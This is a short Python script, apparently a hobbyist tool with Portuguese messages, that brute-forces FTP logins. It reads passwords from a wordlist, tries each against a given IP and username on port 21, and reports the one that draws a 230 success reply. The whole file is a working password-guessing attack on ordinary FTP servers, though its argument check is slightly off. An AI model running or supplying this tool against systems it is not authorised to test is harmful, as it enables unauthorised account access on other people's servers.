import socket
import re
import sys

if len(sys.argv) < 2:
	print("use rick_brute_ftp.py <IP> usuario")
	sys.exit(0)

usuario = sys.argv[2]



file = open("lista.txt")

for linha in file.readlines():
	print("Testando com %s:%s "%(usuario,linha))
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	#s.connect(("192.168.15.42",21))
	s.connect((str(sys.argv[1]),21))
	s.recv(1024)
	user = "USER " + usuario + "\r\n"
	s.send(user.encode('utf-8'))
	s.recv(1024)
	pw = linha.rstrip('\n')
	password = "PASS "+pw+"\r\n"
	s.send(password.encode('utf-8'))
	resultado = s.recv(1024).decode('utf-8')
	s.send("QUIT\r\n".encode('utf-8'))
	s.recv(1024)
	#resultado = str(s.recv(1024).decode('utf-8'))
	#print(resultado)
	if re.search("230",resultado):
		print("[+] ==>> SENHA ENCONTRATA <<== %s [+]"%(pw))
		break
	else:
		print("[-] Acesso Negado [-]\n")
